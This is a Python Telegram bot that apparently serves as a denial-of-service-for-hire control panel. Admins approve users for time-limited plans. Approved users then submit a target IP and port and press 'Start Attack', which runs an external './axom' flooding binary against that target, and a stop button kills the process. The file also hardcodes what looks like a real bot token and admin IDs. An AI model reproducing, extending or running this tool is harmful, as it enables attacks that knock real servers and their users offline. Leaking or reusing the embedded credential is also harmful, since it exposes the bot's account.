import telebot
import logging
import subprocess
import json
from datetime import datetime, timedelta
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

TOKEN = '7538286236:AAFWMsdz8OMWcohzafVX0pAGxWYTp31qQa4'
CHANNEL_ID = -1002177435859
ADMIN_IDS = [5568478295]  # List of admin IDs

bot = telebot.TeleBot(TOKEN)

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
user_attack_details = {}
active_attacks = {}

# Define the file path for user data
USER_DATA_FILE = "users_data.json"

# Function to load user data from the file
def load_user_data():
    try:
        with open(USER_DATA_FILE, 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

# Function to save user data to the file
def save_user_data(data):
    with open(USER_DATA_FILE, 'w') as file:
        json.dump(data, file, indent=4)

# Load initial user data
user_data = load_user_data()

OWNER_ID = 5568478295  # Replace with your actual Telegram user ID
OWNER_NAME = "ANKUR"  # Replace with your actual name

# Function to run the attack command synchronously
def run_attack_command_sync(user_id, target_ip, target_port, action):
    try:
        if action == 1:
            process = subprocess.Popen(["./axom", target_ip, str(target_port), "1", "100"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            active_attacks[user_id] = process.pid
            logging.info(f"Started attack: PID {process.pid} for User {user_id} on {target_ip}:{target_port}")
        elif action == 2:
            pid = active_attacks.pop(user_id, None)
            if pid:
                subprocess.run(["kill", str(pid)], check=True)
                logging.info(f"Stopped attack: PID {pid} for User {user_id} on {target_ip}:{target_port}")
    except Exception as e:
        logging.error(f"Error in run_attack_command_sync: {e}")

# Check if the user is an admin
def is_user_admin(user_id):
    return user_id in ADMIN_IDS

# Check if the user is approved to attack
def check_user_approval(user_id):
    try:
        user_info = user_data.get(str(user_id))
        
        # Check if the user exists and has a valid plan
        if not user_info or user_info.get('plan', 0) <= 0:
            return False

        # Check if there is a valid until date
        valid_until = user_info.get('valid_until', "")
        
        # If no valid_until date or it is still valid
        if valid_until == "" or datetime.now().date() <= datetime.fromisoformat(valid_until).date():
            return True
        
        # If valid_until date has expired
        return False
    except Exception as e:
        logging.error(f"Error in checking user approval for user {user_id}: {e}")
        return False

# Send not approved message
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*🚫 YOU ARE NOT APPROVED 🚫*", parse_mode='Markdown')

# Send welcome message with branding
def send_welcome_message(chat_id):
    welcome_text = (
        "*🎉 Welcome to the Bot! 🎉*\n\n"
        "*🔰 BRAND MOD X AXOM 🔰*\n"
        "*🚫 This script is free and not for sale.*\n"
        "*⚠️ Unauthorized modification will disable the bot.*"
    )
    bot.send_message(chat_id, welcome_text, parse_mode='Markdown')

# Inline buttons to start IP and port selection
def send_ip_port_buttons(chat_id):
    markup = InlineKeyboardMarkup()
    ip_button = InlineKeyboardButton("📍 Select IP and Port", callback_data="select_ip_port")
    markup.add(ip_button)
    bot.send_message(chat_id, "*Choose an action:*", reply_markup=markup, parse_mode='Markdown')

# Inline button to start the attack
def send_start_attack_button(chat_id):
    markup = InlineKeyboardMarkup()
    start_button = InlineKeyboardButton("🚀 Start Attack", callback_data="start_attack")
    markup.add(start_button)
    bot.send_message(chat_id, "*IP and Port set! Now you can start the attack.*", reply_markup=markup, parse_mode='Markdown')

# Inline button to stop the attack
def send_stop_attack_button(chat_id):
    markup = InlineKeyboardMarkup()
    stop_button = InlineKeyboardButton("🛑 Stop Attack", callback_data="stop_attack")
    markup.add(stop_button)
    bot.send_message(chat_id, "*You can now stop the attack.*", reply_markup=markup, parse_mode='Markdown')

# Process IP and port input
def process_ip_port_input(chat_id):
    bot.send_message(chat_id, "*Please provide the target IP and port separated by a space.*", parse_mode='Markdown')
    bot.register_next_step_handler_by_chat_id(chat_id, handle_ip_port)

def handle_ip_port(message):
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.send_message(message.chat.id, "*Invalid format. Provide both target IP and port.*", parse_mode='Markdown')
            return

        target_ip, target_port = args[0], int(args[1])
        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*🚫 Port {target_port} is blocked. Use another port.*", parse_mode='Markdown')
            return

        user_attack_details[message.from_user.id] = (target_ip, target_port)
        send_start_attack_button(message.chat.id)
    except Exception as e:
        bot.send_message(message.chat.id, "*Failed to process IP and port.*", parse_mode='Markdown')
        logging.error(f"Error in processing IP and port: {e}")

# Handle callback queries for inline buttons
@bot.callback_query_handler(func=lambda call: True)
def handle_inline_buttons(call):
    user_id = call.from_user.id

    # Check if the user is approved
    if not check_user_approval(user_id):
        send_not_approved_message(call.message.chat.id)
        return
    
    if call.data == "select_ip_port":
        process_ip_port_input(call.message.chat.id)
    elif call.data == "start_attack":
        attack_details = user_attack_details.get(user_id)
        if attack_details:
            target_ip, target_port = attack_details
            run_attack_command_sync(user_id, target_ip, target_port, 1)
            bot.send_message(call.message.chat.id, f"*🚀 Attack started on Host: {target_ip} Port: {target_port}.*", parse_mode='Markdown')
            send_stop_attack_button(call.message.chat.id)
        else:
            bot.send_message(call.message.chat.id, "*No IP and Port set. Please select them first.*", parse_mode='Markdown')
    elif call.data == "stop_attack":
        attack_details = user_attack_details.get(user_id)
        if attack_details:
            target_ip, target_port = attack_details
            run_attack_command_sync(user_id, target_ip, target_port, 2)
            bot.send_message(call.message.chat.id, f"*🛑 Attack stopped on Host: {target_ip} Port: {target_port}.*", parse_mode='Markdown')
            user_attack_details.pop(user_id, None)
        else:
            bot.send_message(call.message.chat.id, "*No active attack found to stop.*", parse_mode='Markdown')

# Command to approve a user by admin
@bot.message_handler(commands=['approve'])
def approve_user(message):
    if not is_user_admin(message.from_user.id):
        bot.send_message(message.chat.id, "*You are not authorized to approve users.*", parse_mode='Markdown')
        return

    try:
        # Extract user_id and plan duration (in days) from the message
        args = message.text.split()
        if len(args) < 3:
            bot.send_message(message.chat.id, "*Invalid format. Use: /approve <user_id> <plan_duration_days>*", parse_mode='Markdown')
            return

        user_id = args[1]
        plan_duration = int(args[2])

        # Approve the user with a plan and valid_until date
        valid_until = (datetime.now() + timedelta(days=plan_duration)).date().isoformat()
        user_data[user_id] = {"plan": 1, "valid_until": valid_until}

        # Save the updated user data
        save_user_data(user_data)

        bot.send_message(message.chat.id, f"*✅ User {user_id} approved for {plan_duration} days.*", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(message.chat.id, "*Failed to approve the user.*", parse_mode='Markdown')
        logging.error(f"Error in approving user: {e}")

# Start command to show welcome message and action buttons
@bot.message_handler(commands=['start'])
def start_command(message):
    send_welcome_message(message.chat.id)
    send_ip_port_buttons(message.chat.id)

if __name__ == "__main__":
    logging.info("Starting bot...")
    bot.polling(none_stop=True)
